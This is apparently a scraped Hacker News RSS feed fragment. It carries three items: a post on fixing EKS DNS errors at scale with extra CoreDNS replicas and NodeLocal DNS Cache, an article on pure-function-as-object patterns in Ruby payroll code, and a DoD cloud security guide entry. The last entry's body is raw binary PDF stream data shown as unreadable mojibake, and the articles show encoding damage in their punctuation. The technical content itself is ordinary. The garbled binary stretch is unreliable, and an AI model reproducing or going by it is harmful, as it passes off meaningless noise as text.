<p>The EKS clusters are running version 1.12 and we are in the process of upgrading all our clusters to 1.13. Each cluster has a different configuration depending on the customer needs for scale, but all of them scale a lot. As soon as jobs come in ‚Äî be they transcoding jobs, media analysis jobs, deliveries, or anything else ‚Äî the EKS clusters are scaled up by cluster-autoscaler. At peak, clusters may scale to hundreds or thousands of nodes to process the work as soon as possible.</p>
<p>The problems started to appear when customers or internal testing teams were scaling the system to higher limits, such as when transcoding or using FrameDNA to analyze large films or libraries of content. When the Kubernetes cluster was doing intense work and scaling above several hundreds of nodes, the processing time was stagnating or increasing. Having built a cloud native solution, the expectation was that adding additional processing power would lower the processing time.</p>
<p>We quickly established a cross-functional task force to investigate this issue.</p>
<p>A multitude of tools are used for observability at Ownzones: <a href="https://honeycomb.io/">Honeycomb</a> for events and traces, Sysdig for monitoring, Papertrail for logs, <a href="https://sentry.io/">Sentry</a> for error tracking, and more. Investigation into traces from Honeycomb showcased DNS resolution times taking seconds or more:</p>
<figure>
    <img src="https://www.vladionescu.me/posts/eks-dns/1-DNS-lookup-to-s3-taking-1-second.png" alt="A screenshot of a Honeycomb trace showing the DNS lookup for an S3 connection taking almost one second."> <figcaption>
            <p>A DNS lookup for S3 taking almost 1 second</p>
        </figcaption>
</figure>

<p>In some cases DNS lookups were taking multiple seconds:</p>
<figure>
    <img src="https://www.vladionescu.me/posts/eks-dns/2-DNS-lookup-to-s3-taking-2-seconds.png" alt="A screenshot of a Honeycomb trace showing the DNS lookup for an S3 connection taking more than 2 seconds"> <figcaption>
            <p>Sometimes DNS resulution spiked to multiple seconds</p>
        </figcaption>
</figure>

<p>Looking further into network metrics showed DNS errors spiking while work was being processed and recovering when the work was finished:</p>
<figure>
    <img src="https://www.vladionescu.me/posts/eks-dns/3-graph-showing-2-spikes-in-DNS-errors.png" alt="A screenshot of a Sysdig DNS errors graph showing spies in DNS errors"> <figcaption>
            <p>DNS errors spiking when work was happening</p>
        </figcaption>
</figure>

<p>The culprit was identified: when reaching a certain scale, a significant number of DNS errors (<code>EAI_AGAIN</code> and <code>ENOTFOUND</code>) that were leading to a lot of retries. Operations that were supposed to take a couple minutes were taking orders or magnitude longer. For example, transcoding a single 4K feature film in Ownzones Connect takes around 16 minutes. During this time, the EKS cluster is scaled to hundreds of nodes, which are peaking at 1.64 TB/s network traffic to S3 and 8.55k requests per second to S3.&nbsp;&nbsp;And that is for a single video track! Processing files in massively parallel ways is where cloud native approaches shine and Ownzones Connect is fully taking advantage of that. The result is a massive spike of work and DNS traffic. Having multi-second lookup times when doing 8.550 requests per second to S3 adds up to quite a lot.</p>
<p>Since the cause was narrowed down to DNS, the next step was to contact AWS Support.&nbsp;The DNS issues were appearing at scale and spiky workloads were especially affected. After investigation by AWS it was confirmed that the VPC networking was not experiencing elevated error rates, nor was S3.&nbsp;It was pointed out that due to the <a href="https://docs.aws.amazon.com/vpc/latest/userguide/vpc-dns.html#vpc-dns-limits">Amazon VPC DNS Limits</a> of 1024 packets per second per network interface the EKS-default 2 CoreDNS pods can be quickly overloaded. Each CoreDNS pod has to serve DNS traffic from the host through its own elastic network interface, which is limited to 1024 packets per second.</p>
<h3 id="attempt-one-increasing-coredns-pods">Attempt one: increasing CoreDNS pods</h3>
<p>The first and easiest improvement for DNS failures was to increase the number of CoreDNS pods. By default EKS has two replicas and that can be increased:</p>
<pre><code data-lang="console">kubectl scale deployment/coredns \
    --namespace kube-system \
    --current-replicas=2 \
    --replicas=10
</code></pre><p>At Ownzones, we run both on On-Demand Instances as well as on Spot Instances. This is not ideal as CoreDNS pods could be scheduled on a Spot Instance, which may be terminated at any time and potentially add disruption.</p>
<p>To work around this we edited the CoreDNS deployment to only run on On-Demand EC2 instances which we have tagged with the <code>stable</code> label:</p>
<pre><code data-lang="console">kubectl --namespace kube-system edit deployment/coredns

    ...
    spec:
        affinity:
        nodeAffinity:
            requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
            - matchExpressions:
                - key: beta.kubernetes.io/os
                operator: In
                values:
                - linux
                - key: beta.kubernetes.io/arch
                operator: In
                values:
                - amd64
                - key: nodegroup
                operator: In
                values:
                - stable
        containers:
            ...

</code></pre><p>Scaling the CoreDNS pods was an improvement, but we still saw significant error rates. We had thousands of nodes sending network traffic to 10 CoreDNS pods, which were spread on significantly fewer On-Demand nodes.</p>
<h3 id="attempt-two-node-local-dns">Attempt two: Node-local DNS</h3>
<p>Kubernetes developers have an addon that addresses the DNS problem: <a href="https://github.com/kubernetes/kubernetes/tree/master/cluster/addons/dns/nodelocaldns">NodeLocal DNS Cache</a>. Using this addon, a new CoreDNS DaemonSet can be configured so it runs on each node. Those new CoreDNS pods will act as a DNS cache: all pods on a specific node would have their requests sent to the local CoreDNS pod which would either serve a result from cache or forward the request upstream to the main CoreDNS pods.</p>
<p>This massively lowers the volume of DNS queries and makes spike handling a breeze and follows <a href="https://aws.amazon.com/premiumsupport/knowledge-center/dns-resolution-failures-ec2-linux/?nc1=h_ls">the AWS recommendation to cache DNS</a>.&nbsp;The first step is to decide which IP will be used for NodeLocal DNS. Typically <code>169.254.20.10</code> is chosen.</p>
<p>With the IP address decided, the YAML files from <a href="https://github.com/kubernetes/kubernetes/tree/release-1.15/cluster/addons/dns/nodelocaldns">k/k/cluster/addons/dns/nodelocaldns</a> need to be acquired. They cannot be applied directly as some values need to be replaced:</p>
<ul>
<li><code>__PILLAR__DNS__DOMAIN__</code> with <code>cluster.local</code> as per <a href="https://github.com/awslabs/amazon-eks-ami/blob/28845f97c05dacaf699a102faa690a4238b79f02/files/kubelet-config.json#L24">amazon-eks-ami‚Äôs kubelet-config.json.</a></li>
<li><code>__PILLAR__LOCAL__DNS__</code> with <code>169.254.20.10</code>, which is like the default address chosen above that the Node-local DNS will bind to on each node.</li>
<li><code>__PILLAR__DNS__SERVER__</code> with <code>10.100.0.10</code> or <code>172.20.0.10</code> depending on the VPC CIDR. <a href="https://github.com/awslabs/amazon-eks-ami/blob/ca61cc2bb6ef6fe982cc71ede7552a4a2c6b93e9/files/bootstrap.sh#L167-L170">On EKS</a>, the DNS Service is running at one of the two IPs and the relevant one needs to be chosen. The value can be seen by running <code>kubectl -n kube-system get service kube-dns</code> and checking the cluster IP.</li>
</ul>
<p>After the values are replaced the files have to be applied:</p>
<pre><code data-lang="console">kubectl apply -f nodelocaldns.yaml
</code></pre><p>This is not enough: Node-local DNS was installed, but it is not used by the pods! To actually have the pods use Node-local DNS the kubelet running on each node needs to be configured. The DNS resolver for the pods needs to point to the newly created Node-local DNS server running at <code>169.254.20.10</code> on each node.</p>
<p>Users of the amazing <a href="https://eksctl.io/">eksctl</a> project can easily configure this since <a href="https://github.com/weaveworks/eksctl/pull/550">support was added in February</a> by editing the node group definition:</p>
<div><pre><code data-lang="yaml">
...
<span>nodeGroups</span>:
- <span>name</span>: <span>mygroup</span>
    <span>clusterDNS</span>: <span>169.254.20.10</span>
...

</code></pre></div><p>Users of <a href="https://github.com/terraform-aws-modules/terraform-aws-eks">the Terraform community EKS module</a> have to send an extra parameter to the <code>kubelet</code> binary in the worker group definition:</p>
<div><pre><code data-lang="hcl">
...
worker_groups_launch_template <span>=</span> [
    {
        ...
        name <span>=</span> <span>"mygroup"</span>
        kubelet_extra_args <span>=</span> "--node-labels<span>=</span>kubernetes.io/lifecycle<span>=</span>spot,nodegroup<span>=</span>mygroup --cluster-dns<span>=</span><span>169</span>.<span>254</span>.<span>20</span>.<span>10</span><span>"</span>
        ...
    },
    {
        ...
    },
]
...

</code></pre></div><p>That‚Äôs all!</p>
<p>At Ownzones, we have been running the above setup in production for more than 2 months on Amazon EKS and Kubernetes 1.12 with very good results. DNS errors have fallen drastically with 99% of DNS queries resolved in less than 2ms during stress-testing:</p>
<figure>
    <img src="https://www.vladionescu.me/posts/eks-dns/4-DNS-p99-during-stress-testing.png" alt="A screenshot of a Honeycomb query showing consistent low DNS resolution"> <figcaption>
            <p>Dramatic improvement in DNS resolution</p>
        </figcaption>
</figure>

<h3 id="troubleshooting-tips">Troubleshooting tips</h3>
<p>Identifying the need for a more in-depth DNS configuration is not straightforward. Debugging Node-local DNS is a task in itself that requires networking experience and familiarity with networking in Kubernetes.</p>
<p>To lower the time investment, we can share two pointers that would have helped us a lot when starting the investigation.</p>
<h4 id="visibility">Visibility</h4>
<p>Knowing how many CoreDNS replicas to use and knowing if NodeLocal DNS is needed are both two very hard questions. Prometheus and Grafana can showcase the relevant metrics on the <a href="https://grafana.com/grafana/dashboards/7279">CoreDNS dashboard</a>.</p>
<p>While at Ownzones we debugged resolution issues with <a href="https://www.honeycomb.io/">Honeycomb</a>, a tracing solution combined with a rich monitoring setup will likely reach the same depth. An important point is for the investigation to happen ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.vladionescu.me/posts/eks-dns/">https://www.vladionescu.me/posts/eks-dns/</a></em></p>]]>
            </description>
            <link>https://www.vladionescu.me/posts/eks-dns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26201292</guid>
            <pubDate>Sat, 20 Feb 2021 03:38:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Embracing Functional Programming in Ruby (2017)]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26201237">thread link</a>) | @mooreds
<br/>
February 19, 2021 | https://kellysutton.com/2017/09/13/embracing-functional-programming-in-ruby.html | <a href="https://web.archive.org/web/*/https://kellysutton.com/2017/09/13/embracing-functional-programming-in-ruby.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p>At <a href="https://gusto.com/">Gusto</a>, we‚Äôve been knee-deep in a substantial refactor of our system for running payrolls.</p>

<p>Running a payroll requires taking several different inputs such as how much an employee should get paid, where did they work, how much did they work, how much taxes should they pay, how much taxes have they paid this year, and so on and so on.</p>

<p>As a company that offers a payroll service, keeping this piece of the system in tip-top shape is important for the business. Customers love Gusto for its simplicity and speed when it comes to running payroll.</p>

<p>Over the years, this system grew beyond its original mandate. Rather than just serve payroll for one state, it now serves them for all 50 states and the District of Columbia. Although customers love our payroll, internally new engineers had a difficult time understanding the code and making changes safely. This system needed a tune up, so we embarked on a sizable refactor.</p>

<p>Because the process of calculating what you need for a payroll is one big formula, we set the goal of making this system ‚Äúmore functional‚Äù as in functional programming. We wanted to take the process of calculating a payroll and make it one big stateless operation.</p>

<p>The server-side code at Gusto is written in Ruby, a language usually known for its object-oriented and metaprogrammatic roots. Nonetheless, we wanted to integrate some more functional concepts into our code in the hopes of increasing the system‚Äôs safety and clarity. The result has been maintainable code that is easier to reason about and safer to change.</p>

<h2 id="embracing-the-pfaao">Embracing the PFaaO</h2>

<p>Ruby is an expressive language, but it does not lend itself to some common functional practices. Although Ruby allows for closures and first-class functions via <code>Proc</code>s, one does not see many <code>Proc</code>s passed around as objects in idiomatic Ruby.</p>

<p>Throughout our work, we discovered that you can create expressive interfaces with clean internals by embracing both OO and functional aspects of Ruby.</p>

<p>To do this, we used a pattern called <a href="https://www.tomdalling.com/blog/ruby/pure-function-as-an-object-PFAAO-pattern/">Pure Function as an Object (PFaaO)</a>. Essentially, you design objects as you would a <a href="https://en.wikipedia.org/wiki/Pure_function">pure function</a> but dress them up as Ruby classes.</p>

<p>A pure function is a function without observable side effects that always returns the same value for a given set of inputs. That means no talking to the database, no modifying the state of other objects, no accessing the system clock, etc. When we write a PFaaO in Ruby, we want to build an object that has no side effects.</p>

<p>A simple PFaaO might look like the following:</p>

<div><div><pre><code><span>class</span> <span>PayrollCalculator</span>
  <span>def</span> <span>self</span><span>.</span><span>calculate</span><span>(</span><span>payroll</span><span>)</span>
    <span>new</span><span>(</span><span>payroll</span><span>).</span><span>calculate</span>
  <span>end</span>

  <span>def</span> <span>initialize</span><span>(</span><span>payroll</span><span>)</span>
    <span>@payroll</span> <span>=</span> <span>payroll</span>
  <span>end</span>
  <span>private_class_method</span> <span>:new</span>

  <span>def</span> <span>calculate</span>
    <span>PayrollResult</span><span>.</span><span>new</span><span>(</span>
      <span>payroll: </span><span>payroll</span><span>,</span>
      <span>paystubs: </span><span>paystubs</span><span>,</span>
      <span>taxes: </span><span>taxes</span><span>,</span>
      <span>debits: </span><span>debits</span>
    <span>)</span>
  <span>end</span>

  <span>def</span> <span>paystubs</span>
    <span># ...</span>
  <span>end</span>

  <span>def</span> <span>taxes</span>
    <span># ...</span>
  <span>end</span>

  <span>def</span> <span>debits</span>
    <span># ...</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>There‚Äôs quite a bit going on here, so let‚Äôs break it down bit by bit.</p>

<p>First, our class has only one effective public interface: <code>PayrollCalculator.calculate</code>. Because we‚Äôve declared the constructor private using <code>private_class_method :new</code>, the instance method <code>#calculate</code> is effectively private.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>This means that all of the other instance methods we declare are implicitly private, even though there is no explicit <code>private</code> block within this class. Because there‚Äôs no way to <code>.new</code> up an instance, there is not a vector to call any instance methods.</p>

<p>Our method only has one public interface and its designed operation is effectively stateless, therefore we only need to exercise one interface in our tests. Put some data in, assert that the data coming out is what we expected.</p>

<h2 id="referential-transparency-for-free">Referential Transparency for Free</h2>

<p>In our above example, let‚Äôs say that the process of calculating taxes is expensive from a time perspective.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Thus, we want to make a time/space tradeoff to consume more memory to minimize the number of times we need to compute taxes. In our example, calculating both <code>#paystubs</code> and <code>#debits</code> will require the result of <code>#taxes</code>.</p>

<p>Now because each of these private methods is a pure function, we have referential transparency. This means we can replace a method and its parameters with its return value. Think of it like algebra: Given the function <code>f(x) = x + 5</code>, you can safely replace any occurrence of <code>f(2)</code> with the value <code>7</code>.</p>

<p>What does this mean for a Rubyist? Free and safe memoization:</p>

<div><div><pre><code><span>def</span> <span>paystubs</span>
  <span>calculate_paystubs</span><span>(</span><span>taxes</span><span>,</span> <span>...</span><span>)</span>
<span>end</span>

<span>def</span> <span>debits</span>
  <span>calculate_debits</span><span>(</span><span>taxes</span><span>,</span> <span>...</span><span>)</span>
<span>end</span>

<span>def</span> <span>taxes</span>
  <span>@taxes</span> <span>||=</span> <span>calculate_taxes</span><span>(</span><span>@payroll</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>Memoization is a form of caching, and can be fraught with issues if the memoized value does not actually come from a pure function. But because we make everything within the PFaaO pure, we can safely memoize this method call.</p>

<p>This is interesting because it looks like this class is no longer stateless: it now assigns local values. However the only interface is the single <code>.calculate</code> class method, each instance of our PFaaO is single-use. Any intermediate state can never be accessed by externally. Because this cached state is not observable externally, our function is still technically pure.</p>

<p>Much in the way a developer can abstract synchronous and asynchronous behavior, you can do the same with functional purity. Any local state changes are irrelevant in the lifecycle of the PFaaO. These local state changes are not observable from the outside world.</p>

<h2 id="expanding-pfaaos">Expanding PFaaOs</h2>

<p>As I‚Äôve grown in my career, I have become less interested in how software is written but how it is maintained. Software maintenance is the blessing and the curse of any successful project: <em>Congratulations!</em> You have a business with lasting value. <em>Our condolences!</em> You must now pay for all of your mistakes. Nonetheless, it is always preferred to have a business that exists with technical debt, than to have a bankrupt company with a pristine code base.</p>

<p>PFaaOs in Ruby are great because they are easy to maintain. Not only are they easy to test, but they are predisposed to healthy growth.</p>

<p>What do I mean by that?</p>

<p>Let‚Äôs again take the example of our <code>#taxes</code> method. Early in Gusto‚Äôs history (back when it was still known as ZenPayroll), we only offered payroll services in California. Thus, we only needed to worry about payroll taxes for California.</p>

<p>In the grand scheme of things, California is a simple state when it comes to payroll taxes. Our taxes method might have looked like nothing more than the following:</p>

<div><div><pre><code><span>def</span> <span>taxes</span>
  <span>federal_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>california_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>local_taxes</span><span>(</span><span>@payroll</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>Now let‚Äôs say we expanded into a new state, New York. Now our method grows a little bit:</p>

<div><div><pre><code><span>def</span> <span>taxes</span>
  <span>federal_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>california_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>new_york_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>local_california_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>local_new_york_taxes</span><span>(</span><span>@payroll</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>As we expand into every state,<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> this method will grow to be quite large! Furthermore, each of these methods adds to the length of our <code>PayrollCalculator</code> class. Without constant gardening, the class could become difficult to understand.</p>

<p>But because each of our methods within a PFaaO is itself a pure function, we are able to extract classes as we see fit and make each one a new PFaaO. We can safely replace our growing methods with new PFaaOs:</p>

<div><div><pre><code><span>def</span> <span>taxes</span>
  <span>PayrollCalculator</span><span>::</span><span>Taxes</span><span>.</span><span>calculate</span><span>(</span><span>@payroll</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>As we tease apart these different PFaaOs, we also get a much better idea of the input requirements for these service classes. Our <code>@payroll</code> is a large parameter object, and each extracted PFaaO probably only needs a subset of its data.</p>

<p>So we can get away with something like:</p>

<div><div><pre><code><span>def</span> <span>taxes</span>
  <span>PayrollCalculator</span><span>::</span><span>Taxes</span><span>.</span><span>calculate</span><span>(</span>
    <span>@payroll</span><span>.</span><span>only_pay_and_location_data</span>
  <span>)</span>
<span>end</span>
</code></pre></div></div>

<p>Here we assume that the <code>Payroll#only_pay_and_location_data</code> returns a slice of the total data within the instance as a new <a href="https://martinfowler.com/bliki/ValueObject.html">Value Object</a>. This Value Object represents only the data required to calculate the taxes part of running a payroll.</p>

<h2 id="data-is-immutable-by-default">Data is Immutable by Default</h2>

<p>Another important ingredient for scalable PFaaOs is the requirement that all data be immutable by default. <em>This is a drastic change from how most folks traditionally write Ruby.</em></p>

<p>Every time you reach for your <code>=</code>, you‚Äôll need to replace it with a <code>#set</code> or <code>#put</code>. Rather than modifying objects in place, you will get used to returning new copies with new values. (<a href="https://github.com/hamstergem/hamster/">Hamster</a>, which provides great immutable data structures, can help you from having to hand-roll FP functionality.)</p>

<p>What does this mean for Rails? It will often mean creating functions or classes that take <code>ActiveRecord</code> objects and convert them into immutable value objects. For us, we carve out these value objects into the namespace of what we‚Äôre doing. For example, here are the two representations of a payroll in our system:</p>

<div><div><pre><code><span># app/models/payroll.rb</span>
<span>class</span> <span>Payroll</span> <span>&lt;</span> <span>ActiveRecord</span><span>::</span><span>Base</span>
<span>end</span>

<span># app/services/payroll_calculator/payroll.rb</span>
<span>class</span> <span>PayrollCalculator::Payroll</span> <span>&lt;</span> <span>ValueObject</span>
<span>end</span>
</code></pre></div></div>

<p>The <code>ActiveRecord</code> version of a payroll represents the data that lives in the database. It is a superset of the data required for actually running a payroll. Although they have the same name, they do not have the same attributes. For example, the <code>ActiveRecord</code> version of <code>Payroll</code> will have a <code>processed_at</code> attribute, whereas the <code>Payroll</code> that lives in the calculation domain does not.</p>

<p>In the words of <a href="https://kellysutton.com/2017/06/07/domain-driven-design.html"><em>Domain-Driven Design</em></a>, each namespace here is a different Bounded Context. We implement adapters to take <code>ActiveRecord</code> payrolls and turn them into <code>PayrollCalculator</code> payrolls, and vice versa.</p>

<p>The upside of this is the same that you might see in any other large system with well-defined abstractions; changes in models don‚Äôt cross domains. In our example, we can change the structure of the <code>Payroll</code> in our database without needing to change the calculation code. We would only need to change our adapter. Furthermore, this context is entirely separate from the machinations of Rails. We could easily and safely pull this into its own ‚Ä¶</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kellysutton.com/2017/09/13/embracing-functional-programming-in-ruby.html">https://kellysutton.com/2017/09/13/embracing-functional-programming-in-ruby.html</a></em></p>]]>
            </description>
            <link>https://kellysutton.com/2017/09/13/embracing-functional-programming-in-ruby.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26201237</guid>
            <pubDate>Sat, 20 Feb 2021 03:30:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Department of Defense Cloud Computing Security Requirements Guide [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26201217">thread link</a>) | @harporoeder
<br/>
February 19, 2021 | https://rmf.org/wp-content/uploads/2018/05/Cloud_Computing_SRG_v1r3.pdf | <a href="https://web.archive.org/web/*/https://rmf.org/wp-content/uploads/2018/05/Cloud_Computing_SRG_v1r3.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div endstream="" endobj="" startxref="" obj="" c="" filter="" flatedecode="" i="" length="" o="" s="">&gt;stream
h√û√¨V}lS√ó¬ø√∑¬Ω√ª√åK√¶$√Ø9¬∂√£mÀÜ:√Å)^G‚Ä°¬µ&amp;√è¬±
P√¢?√≥Bp"√á	+ÀÜ¬®%¬•0ÔøΩ√Æ√ã√ß√ã‚Ä†6√ó-+¬•√ªÀÜ‚Ä∫:m√ì2√ñUl√´6[¬±√∫√ÅK[√ÅF‚Äû63ÔøΩ(‚Äú√ö‚Ä∞j√≠√îU√≠√ú√ßÀú√∂¬°u√í√æ√´√≥}√ßÔøΩs√Æ9¬ø{√é√Ø^K!√Ñ√Åx√±‚Äòo"¬∫√ª√òAxE≈°‚ÄπzlQw¬Æ"≈ì¬´√∞d'A√±√§p¬£√≠‚Äπ√û3¬≠≈æ\¬´g¬™‚Ä¢pA‚Äö‚ÄùkugE√¥√§‚Äö√Æ\‚Äù√ò√êj√á¬Ω(√Ö{¬°‚Äòd*‚Äò≈∏√•√Ω¬æÀÜU¬æD√ñ√ì√π√îg≈æ@v√≤t√∞¬æT√ª√Ö¬∫-√Çg√±'√úa;N[.√†√ß‚Äù‚Ä°‚Ä∞√Ωk\EHY¬∞7?√†,√ù√¨√ΩcM=?
]√Ø:(√π‚Äù√æÔøΩ√í√É√±≈°9¬≤√Æ√µ¬§√¢~√õ8√π√µ¬ªwDmo‚Äò√ü*¬•¬∂C√∂∆ídB‚Äî√ú√≤√ï2¬¨W√ª6¬ß¬•√≥¬§√°s~√ª¬∫√∫kG√¶√Ä√Ω¬ß‚Ä¶√óN√ç√ìU√Æ√ù√É√ù7¬∑y√•√Ø	5√Å5√ä√∂Wqao0√´$≈Ω¬ß√à¬æ`≈∏;x4√Ω9‚Ä†√ù√ì√™‚Äùmi√ê‚Ä∫b[
‚Ä∫k5‚Äù√ñm=$¬§√ó(ÔøΩ¬∑lÀú√¥h√£‚Äö\√†≈∏A√≥¬≥¬≠/√à]d¬Ø*¬µ!√π√ß√§\PÀúm√∑√ô√û'+√≤dw¬≤`¬©/$|≈∏√≥‚Ä∞√ß√â2¬Ω2¬ª√©¬•≈°.r4h≈í,H‚Ä°I¬ø~≈∏oS¬∫z+√©√å#√•!e7√∑}n¬∞1‚Ç¨√ø$√û√¶[¬Æ8 ‚Äù√¥‚Ä∫ÀÜ0‚Ñ¢√ü2¬Ω¬≠X√´%√á√µ/!%^ÔøΩ#‚Äî√¥*≈°
√õ¬®√†√Å+bq√Ö~√ù√Ç√´¬ªK¬≠¬¥√ÆmaN√Ø‚Ñ¢J¬ø√µ¬±O√∂B√Ü√ózM√∫?¬Æ√Ø,¬µ*5k√âO‚Ä¢≈∏vy¬´j√π+√™|√â¬æ≈°,√§√ü√ç‚Ä†‚Äì√õ√óÔøΩ√µ¬∫*√≠√±√ô≈Ω	/‚Äù¬©Z√ùAa_a√ì√ç¬≠√é√§Wvy¬™√†¬ø‚Äö√ï√Å‚Äì¬¨c≈ΩXqsi¬ª¬Ω√≤√ã√ú√ü‚Ä†?¬∏√π‚Äπkn‚Äú¬∑[n√ç~√ø¬¨S¬∂&lt;¬¢w+;_u¬≤√ÅÔøΩ‚Äùj¬Ø√ïv
¬ø√í¬Ø+6≈†¬™Q ÔøΩ√ú√ç‚Ä∞√É¬ΩF√Ç≈°¬∑D‚Äô¬ßr√üQ¬µ¬°√≥g[‚Äô¬£5m4√°_ÔøΩD^K¬™j"r√≤Ht√¥√∞√∏√ë#CÔøΩ√áN≈ì√æ√Æ¬Æ√§√û√¨{4|√¢√πo√Ö√Ω}}ÔøΩ√ªÔøΩG7¬´√•¬ß√Ø√ÆwI-?‚Ä∞√±L&amp;cj√ç√°*√∑√¶√•√æB4√µJ√å&gt;¬æ}√∞
¬°}"¬∂.√∏q√∑+√Ñ‚ÄîÀÜ‚Ä°¬§¬©D}¬¨√®√ç&amp;V¬Ø√Ö√öt√ë√ßREs¬¥‚Ä¶¬§]{c&amp;ÔøΩOX‚Ä¢√≤¬±¬©¬æ√âq√å=‚Ä¢≈æ&amp;¬º¬ß√ó√°√ç‚Ä¶^GW√≥d√úate‚Äπ^¬©ÔøΩ|\≈í7Uz¬ßLp¬µ'U√®√©√°‚Ä¶¬±√â√©≈í√ì‚Ä°o≈æd¬¶√£T|√∏‚Äög-2¬¢√©IX¬•+d,Y¬•Wz≈ì	¬´3$IW√ô≈†‚Ñ¢h`ÔøΩ‚Ä∞√∫≈ΩÔøΩ‚Äî√π;‚Äú5√û¬ßcU)u`¬º
¬´√£4√îS≈∏y¬≥I5U√ò√ó√´¬∞≈æ	jcÔøΩ ‚ÄúSs‚Ç¨¬∞≈∏√¨¬∂:g$¬©(√ºxD≈æN0S√ô¬≠√πvkMFr√º‚Ä†√∫√î&nbsp;	/¬∂√Ö‚Ä∫d√ÖyM√≥uic!	@√≤√ÖA√áÀÜT√ß¬¥*]Z√ìrVRH√é√Ø√ë
B√Æ,√ó2)\‚Ä†v√å¬æ.f√Ø_¬∑√ñ¬∑¬¨Y5{√ÅS‚Äî¬∞‚Äìg√ç√ö‚Ä†√ä√≤√í√∑√á‚Äû√π65U≈í&nbsp;√§√Ü√ò√´≈†¬≥M-‚Ñ¢¬∫:A‚Äπ,‚Äöawz√©%√ç√ó¬≠√∂VXaw=¬ª¬°y2‚ÄöTm√¢YO¬≥√æ√Ñ√ò√â√¥T‚Äò¬≠;√è≈†√ó√Ü√∂¬¶‚Ä∫*K‚Ä∞c√ê√©P√Ñ‚Äù√£√•≈°‚Ä∞J≈°√©{√´3m√±¬≥1k '¬ºyQ√®≈∏)wG√•Àú9~√è√òh√ß¬Ω'∆í√ö√ÑU√≤≈æY√û√ªNs¬ØS@H'*Z;B:E√¢K%√õyA√£%‚ÄîJ‚Ä¢√´B;?√™‚Ç¨ÔøΩ-Àú√Ö√¥L≈°‚Ä°m2U√®lX,√Ü‚Äù0F,ÔøΩ¬∞S*`?‚Äö
√º√∑√¶‚Ñ¢√ø5‚Äò‚Ñ¢√Ü√ø√≥C≈°¬ΩL0¬π¬≠‚Äò;\M√ã√æ‚Ä¶¬¢}√µC√Ä√ß¬æÔøΩH)2"E¬¢ÔøΩdCDa∆íy‚Ç¨)*√Ç≈ìA(v√¶¬º√πc&gt;‚Äò‚Äò¬®A¬±√å√ÇE√≥0√¶B
√†√¢)f≈ì¬ß≈ì¬•H√∂‚Äö‚Ç¨ÔøΩ√¢`≈†),√èH√ê√¶√π#√ìe&amp;
¬ÆA3G¬πLy1D‚Ç¨‚Äö,¬π¬®Y‚Äπy¬©¬©√ä¬≤√®2+3‚Ç¨l^‚Äì1D,f¬π√Ä√Ñ¬¨0
G
√î√†5@b∆ír4¬¢¬±¬¶)¬ß‚Äö√ÉK√âv*0‚Äî60&nbsp;sa√É√¥¬ªh‚Äù√èÀú√ë"[¬±≈æ@r≈í√ñ=r‚Ä¢#√â¬°1√â‚Ä¢)¬•√æ¬∞Y$$TC&amp;‚Äπ√∂(√ê√â~√Ä√¥=√Ä1ÀÜ√öp%KÔøΩr@‚Ä†H3‚Ä°
√∂¬•&lt;√±‚Ä†√≤ÔøΩ1≈†∆í¬Æ
Àúp¬≤¬±c
√å`√∞¬¢¬∂(√ä√õ√Æ¬∫√•*|√á√Ñw|√†‚Äò√Øx¬∞ÔøΩ√ê¬Ω1√¢?¬¶√ú5√Ö?¬ªm/≈∏√±≈∏¬æ¬∑~≈†K@&nbsp;√ë¬®√∏√ë-√´¬£[√ñ¬ºe√Å√ø1ÔøΩV¬Æ√∫+√¨¬≥√û‚Ä¢√¶√ù\E2D¬ø¬°‚Ä°RU(¬∂√°‚Äú)≈æ√´√≠√ß¬øÔøΩ‚Ä°√ã|√ª/E√°√ñ√∫¬≠¬•"√øLL√ª‚Äù√ª√ì+.U%or‚Ä¢¬ø√§'c√õ¬µ‚Ä¢DV*¬∫‚Äû-√ú≈°√º‚Äπ√π√Ö‚Ä∫?¬ß#√è¬π√´&nbsp;‚Äûf√ÅC≈æ√ã?√ª√≥ÀÜ√õw¬æ2¬≤≈í/√ª√ù√ê√ãs}cWÔøΩ¬µQy¬≠√öy¬¶0¬º¬∑√ø.√ÄD¬π√°
endstream
endobj
13478 0 obj
&lt;&gt;/Metadata 751 0 R/Outlines 2529 0 R/PageLayout/OneColumn/Pages 13418 0 R/StructTreeRoot 2846 0 R/Type/Catalog&gt;&gt;
endobj
13479 0 obj
&lt;&gt;/ExtGState&lt;&gt;/Font&lt;&gt;/XObject&lt;&gt;&gt;&gt;/Rotate 0/StructParents 0/Tabs/S/Type/Page&gt;&gt;
endobj
13480 0 obj
&lt;&gt;stream
h√û√îU√ùo√ì0√øW√º√ÉNb'≈Ω4Mj√ã
‚Äú√òÀú‚Äì≈†!M{mh#√ö¬§j2¬±√Ω√∑√ú]l√ó
√ç{A&lt;\}¬π/√ü‚Äî
"¬©c&amp;Xg√Ç√Ç‚Ç¨√çdHL
